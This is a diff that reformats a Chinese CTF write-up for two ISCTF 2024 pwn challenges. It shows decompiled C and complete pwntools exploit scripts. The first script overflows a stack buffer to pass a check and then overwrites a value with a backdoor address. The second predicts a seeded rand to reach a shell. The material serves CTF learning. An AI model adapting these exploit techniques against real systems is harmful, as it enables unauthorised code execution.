@@ -10,474 +10,82 @@ by Maple
 **main:**
 
 
-```
-
-int
-
-__fastcall
-
-main
-(
-int
-
-argc
-,
-
-const
-
-char
-
-**
-argv
-,
-
-const
-
-char
-
-**
-envp
-)
-
+```asm
+int __fastcall main(int argc, const char **argv, const char **envp)
 {
+  char buf[40]; // [rsp+0h] [rbp-30h] BYREF
+  char s1[8]; // [rsp+28h] [rbp-8h] BYREF
 
-
-char
-
-buf
-[
-40
-];
-
-// [rsp+0h] [rbp-30h] BYREF
-
-
-char
-
-s1
-[
-8
-];
-
-// [rsp+28h] [rbp-8h] BYREF
-
-
-init
-(
-argc
-,
-
-argv
-,
-
-envp
-);
-
-
-puts
-(
-"welcome to isctf2024"
-);
-
-
-puts
-(
-"first i need your team id"
-);
-
-
-read
-(
-0
-,
-
-buf
-,
-
-0x30uLL
-);
-
-
-if
-
-(
-
-strcmp
-(
-s1
-,
-
-"admin"
-)
-
-)
-
-
-{
-
-
-puts
-(
-"no no no"
-);
-
-
-exit
-(
-0
-);
-
-
+  init(argc, argv, envp);
+  puts("welcome to isctf2024");
+  puts("first i need your team id");
+  read(0, buf, 0x30uLL);
+  if ( strcmp(s1, "admin") )
+  {
+    puts("no no no");
+    exit(0);
+  }
+  puts("ok, go on");
+  vuln();
+  return 0;
 }
-
-
-puts
-(
-"ok, go on"
-);
-
-
-vuln
-();
-
-
-return
-
-0
-;
-
-}
-
 ```
 
 要求`s1`和为`admin`，可以看到`s1`距离栈底偏移为0x28，所以填充0x28个数据再写入admin就好了
 
 
 ```
-
-payload
-
-=
-
-b
-'b'
-*
-0x28
-
-+
-
-b
-'admin'
-
-p
-.
-sendafter
-(
-b
-'team id'
-,
-
-payload
-)
-
+payload = b'b'*0x28 + b'admin'
+p.sendafter(b'team id', payload)
 ```
 
 **vuln:**
 
 
-```
-
-__int64
-
-vuln
-()
-
+```c
+__int64 vuln()
 {
+  __int64 result; // rax
+  _QWORD v1[5]; // [rsp+0h] [rbp-30h] BYREF
+  __int64 i; // [rsp+28h] [rbp-8h]
 
-
-__int64
-
-result
-;
-
-// rax
-
-
-_QWORD
-
-v1
-[
-5
-];
-
-// [rsp+0h] [rbp-30h] BYREF
-
-
-__int64
-
-i
-;
-
-// [rsp+28h] [rbp-8h]
-
-
-for
-
-(
-
-i
-
-=
-
-0L
-L
-;
-
-i
-
-<=
-
-7
-;
-
-++
-i
-
-)
-
-
-{
-
-
-printf
-(
-"please input your %d girlfriend birthday
-\n
-"
-,
-
-i
-
-+
-
-1
-);
-
-
-result
-
-=
-
-__isoc99_scanf
-(
-"%ld"
-,
-
-&
-v1
-[
-i
-]);
-
-
+  for ( i = 0LL; i <= 7; ++i )
+  {
+    printf("please input your %d girlfriend birthday\n", i + 1);
+    result = __isoc99_scanf("%ld", &v1[i]);
+  }
+  return result;
 }
-
-
-return
-
-result
-;
-
-}
-
 ```
 
 一共八次输入，但v1只有5个元素，第八次输入的时候恰好会覆盖result，所以前面先输入一些，第八次改为后门函数的地址就可以了
 
 
-```
-
-for
-
-i
-
-in
-
-range
-(
-7
-):
-
-
-p
-.
-recvuntil
-(
-b
-'birthday
-\n
-'
-)
-
-
-p
-.
-sendline
-(
-b
-'5'
-)
-
-payload
-
-=
-
-str
-(
-0x40121E
-)
-
-p
-.
-sendlineafter
-(
-b
-'birthday
-\n
-'
-
-,
-
-payload
-)
-
+```python
+for i in range(7):
+    p.recvuntil(b'birthday\n')
+    p.sendline(b'5')
+payload = str(0x40121E)
+p.sendlineafter(b'birthday\n' , payload)
 ```
 
 **总exp**：
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
-context
-.
-log_level
-
-=
-
-'debug'
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
-payload
-
-=
-
-b
-'b'
-*
-0x28
-
-payload
-
-+=
-
-b
-'admin'
-
-p
-.
-sendafter
-(
-b
-'team id'
-,
-
-payload
-)
-
-for
-
-i
-
-in
-
-range
-(
-7
-):
-
-
-p
-.
-recvuntil
-(
-b
-'birthday
-\n
-'
-)
-
-
-p
-.
-sendline
-(
-b
-'5'
-)
-
-payload
-
-=
-
-str
-(
-0x40121E
-)
-
-p
-.
-sendlineafter
-(
-b
-'birthday
-\n
-'
-
-,
-
-payload
-)
-
-p
-.
-interactive
-()
-
+```python
+from pwn import *
+elf = ELF("./pwn")
+context.log_level = 'debug'
+p = process('./pwn')
+payload = b'b'*0x28
+payload += b'admin'
+p.sendafter(b'team id', payload)
+for i in range(7):
+    p.recvuntil(b'birthday\n')
+    p.sendline(b'5')
+payload = str(0x40121E)
+p.sendlineafter(b'birthday\n' , payload)
+p.interactive()
 ```
 
 
@@ -490,427 +98,65 @@ by Maple
 先看源码
 
 
-```
-
-int
-
-__fastcall
-
-main
-(
-int
-
-argc
-,
-
-const
-
-char
-
-**
-argv
-,
-
-const
-
-char
-
-**
-envp
-)
-
+```python
+int __fastcall main(int argc, const char **argv, const char **envp)
 {
-
-
-int
-
-v4
-;
-
-// [rsp+Ch] [rbp-1A4h] BYREF
-
-
-char
-
-v5
-[
-400
-];
-
-// [rsp+10h] [rbp-1A0h] BYREF
-
-
-unsigned
-
-int
-
-seed
-;
-
-// [rsp+1A0h] [rbp-10h]
-
-
-int
-
-v7
-;
-
-// [rsp+1A8h] [rbp-8h]
-
-
-int
-
-i
-;
-
-// [rsp+1ACh] [rbp-4h]
-
-
-init
-(
-argc
-,
-
-argv
-,
-
-envp
-);
-
-
-seed
-
-=
-
-1
-;
-
-
-puts
-(
-"Welcome to ISCTF's pwn mini-game."
-);
-
-
-puts
-(
-"This procedure is only 15 seconds"
-);
-
-
-signal
-(
-14
-,
-
-handle_sigalrm
-);
-
-
-alarm
-(
-0xFu
-);
-
-
-printf
-(
-"Enter your username: "
-);
-
-
-gets
-(
-v5
-);
-
-
-srand
-(
-seed
-);
-
-
-for
-
-(
-
-i
-
-=
-
-0
-;
-
-i
-
-<=
-
-20000
-;
-
-++
-i
-
-)
-
-
-{
-
-
-v7
-
-=
-
-rand
-()
-
-%
-
-7
-
-+
-
-1
-;
-
-
-printf
-(
-"Round %d
-\n
-"
-,
-
-(
-unsigned
-
-int
-)(
-i
-
-+
-
-1
-));
-
-
-printf
-(
-"Please enter the number you want to guess: "
-);
-
-
-__isoc99_scanf
-(
-"%d"
-,
-
-&
-v4
-);
-
-
-if
-
-(
-
-v7
-
-!=
-
-v4
-
-)
-
-
-{
-
-
-puts
-(
-"Wrong, goodbye"
-);
-
-
-exit
-(
-1
-);
-
-
+  int v4; // [rsp+Ch] [rbp-1A4h] BYREF
+  char v5[400]; // [rsp+10h] [rbp-1A0h] BYREF
+  unsigned int seed; // [rsp+1A0h] [rbp-10h]
+  int v7; // [rsp+1A8h] [rbp-8h]
+  int i; // [rsp+1ACh] [rbp-4h]
+
+  init(argc, argv, envp);
+  seed = 1;
+  puts("Welcome to ISCTF's pwn mini-game.");
+  puts("This procedure is only 15 seconds");
+  signal(14, handle_sigalrm);
+  alarm(0xFu);
+  printf("Enter your username: ");
+  gets(v5);
+  srand(seed);
+  for ( i = 0; i <= 20000; ++i )
+  {
+    v7 = rand() % 7 + 1;
+    printf("Round %d\n", (unsigned int)(i + 1));
+    printf("Please enter the number you want to guess: ");
+    __isoc99_scanf("%d", &v4);
+    if ( v7 != v4 )
+    {
+      puts("Wrong, goodbye");
+      exit(1);
+    }
+    puts("Congratulations, you win!");
+  }
+  getshell();
+  return 0;
 }
-
-
-puts
-(
-"Congratulations, you win!"
-);
-
-
-}
-
-
-getshell
-();
-
-
-return
-
-0
-;
-
-}
-
 ```
 
 seed = 1，2w次循环，全猜对了就可以getshell，那就跟着来就行
 
 
-```
+```python
+from pwn import *
+from ctypes import *
 
-from
+p = process('./ez_game')
+elf = ELF('./ez_game')
+libc = cdll.LoadLibrary('./libc.so.6')
 
-pwn
+libc.srand(1);  # 设置随机数种子为1，源码是这样写的
+result = [0]*20001  # 创建一个20001长度的列表，初始化为0
+for i in range(20001):
+    result[i] = str(libc.rand()%7+1)
 
-import
+payload = b'a'
+p.sendlineafter(b'username: ',payload)
 
-*
+for i in range(20001):
+    p.sendline(result[i])
 
-from
-
-ctypes
-
-import
-
-*
-
-p
-
-=
-
-process
-(
-'./ez_game'
-)
-
-elf
-
-=
-
-ELF
-(
-'./ez_game'
-)
-
-libc
-
-=
-
-cdll
-.
-LoadLibrary
-(
-'./libc.so.6'
-)
-
-libc
-.
-srand
-(
-1
-);
-
-
-# 设置随机数种子为1，源码是这样写的
-
-result
-
-=
-
-[
-0
-]
-*
-20001
-
-
-# 创建一个20001长度的列表，初始化为0
-
-for
-
-i
-
-in
-
-range
-(
-20001
-):
-
-
-result
-[
-i
-]
-
-=
-
-str
-(
-libc
-.
-rand
-()
-%
-7
-+
-1
-)
-
-payload
-
-=
-
-b
-'a'
-
-p
-.
-sendlineafter
-(
-b
-'username: '
-,
-payload
-)
-
-for
-
-i
-
-in
-
-range
-(
-20001
-):
-
-
-p
-.
-sendline
-(
-result
-[
-i
-])
-
-p
-.
-interactive
-()
-
+p.interactive()
 ```
 
 
